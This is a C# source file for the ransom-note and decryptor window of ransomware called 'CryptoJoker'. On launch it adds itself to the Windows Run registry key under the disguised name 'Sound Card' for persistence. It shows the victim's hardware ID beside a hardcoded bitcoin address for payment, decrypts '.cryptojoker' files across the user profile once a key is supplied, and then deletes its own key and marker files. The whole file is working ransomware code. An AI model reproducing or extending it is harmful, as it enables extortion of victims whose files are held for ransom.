using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace CryptoJokerDecryptor
{
    public partial class CryptoJokerDecryptor : Form
    {
        public CryptoJokerDecryptor()
        {
            InitializeComponent();
            if(!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "jokingwithyou.cryptojoker")))
                Environment.Exit(1);
            if (!JokerDecryptorIsNotRunning())
                Environment.Exit(1);
        }

        private void CryptoJokerGUI_Load(object sender, EventArgs e)
        {
            RegistryKey reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            reg.SetValue("Sound Card", Assembly.GetEntryAssembly().Location);
            reg.Close();
            CryptoMessageTxt.Text = CryptoMessageTxt.Text.Replace("[HWID goes here]", GetHwid());
            CryptoMessageTxt.Text = CryptoMessageTxt.Text.Replace("[bitcoin address]", "1yh3eJjuXwqqXgpu8stnojm148b8d6NFQ");
            PersonalIDTxt.Text = GetHwid();
        }

        private string GetHwid()
        { 
            UHWIDEngine engine = new UHWIDEngine();
            return engine.SimpleUID;
        }

        private void CopyPersonalIDBtn_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(PersonalIDTxt.Text);
        }

        private void CopyBitcoinAddressBtn_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(BitcoinAdressLbl.Text);
        }

        private void DecryptBtn_Click(object sender, EventArgs e)
        {
            KeyValidationWindow keyValidationWin = new KeyValidationWindow();
            keyValidationWin.ShowDialog();

            if (keyValidationWin.PublicPrivateKey != string.Empty)
            {
                var MessageBoxResult = MessageBox.Show(
                    "The decryption process may take a while. Please close any other program and then wait patiently for the decryption process to finish.",
                    "Decryption process will start soon", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
                if (MessageBoxResult == DialogResult.OK)
                {
                    Thread th =
                        new Thread(() => RunDecryptor(keyValidationWin.PublicPrivateKey))
                        {
                            Name = "DecryptionProcessThread"
                        };
                    th.Start();
                }
            }
        }

        private void RunDecryptor(string publicPrivateKey)
        {
            DecryptionProgressBarForm decProForm = new DecryptionProgressBarForm();
            foreach (Form form in Application.OpenForms)
            {
                if (form.Text == "Crypto Joker 1.0")
                {
                    Thread the = new Thread(() => { decProForm.ShowDialog(form); });
                    the.Start();
                    break;
                }
            }

            string signalFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "jokingwithyou.cryptojoker");
            string decryptionInformationTxtFile =
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    "CryptoJoker Recovery Information.txt");
            string currentUserPath = Environment.GetEnvironmentVariable("USERPROFILE");
            string encryptionKeyFilePath =
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "encKey.cryptojoker");
            CryptoClass cryptoClass = new CryptoClass();
            byte[] decryptionKey = null;
            List<string> currentUserFiles = null;

            try
            {
                decryptionKey = Convert.FromBase64String(File.ReadAllText(encryptionKeyFilePath));

                cryptoClass = new CryptoClass(Encoding.Unicode.GetString(cryptoClass.RsaDecryption(decryptionKey, 1024, publicPrivateKey)));
                currentUserFiles = GetFiles(currentUserPath, "*.*");
            }
            catch (Exception exception)
            {
                decProForm.Close();
                MessageBox.Show(exception.Message, "Decryption process failed", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }

            foreach (var file in currentUserFiles)
            {
                try
                {
                    string restoredFileName = string.Empty;
                    FileInfo fileInfo = new FileInfo(file);

                    if (fileInfo.Extension == ".cryptojoker")
                    {
                        if (fileInfo.Name.Contains(".txt") || fileInfo.Name.Contains(".md"))
                        {
                            cryptoClass.DecryptFileFully(fileInfo.FullName);
                            restoredFileName = fileInfo.Name.Replace(".fully.cryptojoker", "");
                            File.Move(fileInfo.FullName,
                                Path.Combine(fileInfo.DirectoryName, restoredFileName));
                        }
                        else
                        {
                            //then it's an executable or whatever
                            cryptoClass.DecryptFilePartially(fileInfo.FullName);
                            restoredFileName = fileInfo.Name.Replace(".partially.cryptojoker", "");
                            File.Move(fileInfo.FullName,
                                Path.Combine(fileInfo.DirectoryName, restoredFileName));
                        }
                    }
                }
                catch (Exception)
                {
                    // ignored
                }
            }
            //cleanup
            if(File.Exists(signalFilePath))
                File.Delete(signalFilePath);
            if(File.Exists(encryptionKeyFilePath))
                File.Delete(encryptionKeyFilePath);
            if(File.Exists(decryptionInformationTxtFile))
                File.Delete(decryptionInformationTxtFile);
            decProForm.Close();
            MessageBox.Show("Decryption done!", "Decryption done ! Now you should have your files back !!",
                MessageBoxButtons.OK, MessageBoxIcon.Information);
            Environment.Exit(0);
        }

        private List<string> GetFiles(string path, string pattern)
        {
            var files = new List<string>();

            try
            {
                files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
                foreach (var directory in Directory.GetDirectories(path))
                    files.AddRange(GetFiles(directory, pattern));
            }
            catch (Exception) { }

            return files;
        }

        private bool JokerDecryptorIsNotRunning()
        {
            bool result;
            var mutex = new Mutex(true, "CryptJokerWalkerDecryptor90912", out result);

            if (!result)
                return false; //another instance is already running

            GC.KeepAlive(mutex);
            return true;
        }
    }
}
